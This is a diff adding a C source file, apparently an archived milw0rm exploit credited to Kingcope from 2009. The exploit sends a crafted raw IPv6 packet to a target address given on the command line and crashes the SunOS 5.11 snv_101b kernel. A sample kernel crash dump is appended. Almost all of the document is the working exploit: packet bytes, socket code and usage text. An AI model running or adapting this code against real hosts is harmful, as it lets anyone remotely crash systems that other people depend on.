@@ -1,0 +1,104 @@
+/*
+	SunOS Release 5.11 Version snv_101b Remote IPV6 
+	Kernel Crash Exploit 0day
+	By Kingcope/2009
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+unsigned char rawData[] =
+"\x60\xfc\x57\x29\x00\x00\x3c\x56\x6f\x35\x40\x72\x70\x2f\x52\x58"
+"\xcc\x95\x12\x79\x30\xbb\xbe\x25\xfe\x80\x00\x00\x00\x00\x00\x00"
+"\x02\x0c\x29\xff\xfe\xf1\x1e\xbb";
+
+int main(int argc, char *argv[])
+{
+  struct sockaddr_in6 dst;
+  int s;
+
+  if (argc < 2)
+  {
+    printf("SunOS Release 5.11 Version snv_101b Remote IPV6 Kernel Crash Exploit 0day By Kingcope/2009\n");
+    printf("Usage: %s <dst>\n", *argv);
+    return(1);
+  }
+
+  memset(&dst, 0, sizeof(dst));
+  if (inet_pton(AF_INET6, (char *)argv[1], (struct in6_addr *) &dst.sin6_addr) != 1) {
+	printf("Error: inet_pton()\n");
+	exit(-1);
+	}
+	memcpy(rawData+24, &dst.sin6_addr, 16);
+
+  dst.sin6_family = AF_INET6;
+
+  s = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
+  if (s == -1)
+    return(1);
+
+  printf("Sending IPV6 packet: %s\n", argv[1]);
+
+  if (sendto(s,&rawData,sizeof(rawData),0,(struct sockaddr*)&dst,sizeof(dst)) == -1)
+  {
+	perror("Error sending packet");
+	exit(-1);
+  }
+
+  return(0);
+}
+
+/*
+Kernel Crash Dump May Look Like The Following Snippet
+[ID 965332 kern.notice] ipsec_needs_processing_v6
+[ID 100000 kern.notice]
+[ID 655072 kern.notice] ffffff00012b9650 ip:ipsec_needs_processing_v6+10c ()
+[ID 655072 kern.notice] ffffff00012b96f0 ip:ipsec_early_ah_v6+75 ()
+[ID 655072 kern.notice] ffffff00012b9860 ip:ip_rput_data_v6+f4e ()
+[ID 655072 kern.notice] ffffff00012b9940 ip:ip_rput_v6+64e ()
+[ID 655072 kern.notice] ffffff00012b99b0 unix:putnext+21e ()
+[ID 655072 kern.notice] ffffff00012b9a00 dld:dld_str_rx_fastpath+8a ()
+[ID 655072 kern.notice] ffffff00012b9ad0 dls:i_dls_link_rx+2c7 ()
+[ID 655072 kern.notice] ffffff00012b9b50 mac:mac_do_rx+b7 ()
+[ID 655072 kern.notice] ffffff00012b9b80 mac:mac_rx+1f ()
+[ID 655072 kern.notice] ffffff00012b9bd0 e1000g:e1000g_intr+135 ()
+[ID 655072 kern.notice] ffffff00012b9c20 unix:av_dispatch_autovect+7c ()
+[ID 655072 kern.notice] ffffff00012b9c60 unix:dispatch_hardint+33 ()
+[ID 655072 kern.notice] ffffff00012c5870 unix:switch_sp_and_call+13 ()
+[ID 655072 kern.notice] ffffff00012c58c0 unix:do_interrupt+9e ()
+[ID 655072 kern.notice] ffffff00012c58d0 unix:cmnint+ba ()
+[ID 655072 kern.notice] ffffff00012c5a00 unix:ddi_mem_putb+f ()
+[ID 655072 kern.notice] ffffff00012c5a40 ata:ata_disk_start_dma_out+88 ()
+[ID 655072 kern.notice] ffffff00012c5a90 ata:ata_ctlr_fsm+1fb ()
+[ID 655072 kern.notice] ffffff00012c5af0 ata:ata_hba_start+84 ()
+[ID 655072 kern.notice] ffffff00012c5b30 ata:ghd_waitq_process_and_mutex_hold+df ()
+[ID 655072 kern.notice] ffffff00012c5ba0 ata:ghd_intr+8d ()
+[ID 655072 kern.notice] ffffff00012c5bd0 ata:ata_intr+27 ()
+[ID 655072 kern.notice] ffffff00012c5c20 unix:av_dispatch_autovect+7c ()
+[ID 655072 kern.notice] ffffff00012c5c60 unix:dispatch_hardint+33 ()
+[ID 655072 kern.notice] ffffff0001205ab0 unix:switch_sp_and_call+13 ()
+[ID 655072 kern.notice] ffffff0001205b00 unix:do_interrupt+9e ()
+[ID 655072 kern.notice] ffffff0001205b10 unix:cmnint+ba ()
+[ID 655072 kern.notice] ffffff0001205c00 unix:mach_cpu_idle+b ()
+[ID 655072 kern.notice] ffffff0001205c40 unix:cpu_idle+17b ()
+[ID 655072 kern.notice] ffffff0001205c60 unix:idle+4c ()
+[ID 655072 kern.notice] ffffff0001205c70 unix:thread_start+8 ()
+[ID 100000 kern.notice]
+[ID 672855 kern.notice] syncing file systems...
+[ID 904073 kern.notice]  done
+[ID 111219 kern.notice] dumping to /dev/zvol/dsk/rpool/dump, offset 65536, content: kernel
+[ID 409368 kern.notice] ^M100% done: 56726 pages dumped, compression ratio 3.59,
+[ID 851671 kern.notice] dump succeeded
+[ID 540533 kern.notice] ^MSunOS Release 5.11 Version snv_101b 64-bit
+[ID 172908 kern.notice] Copyright 1983-2008 Sun Microsystems, Inc.  All rights reserved.
+*/
+
+// milw0rm.com [2009-01-26]
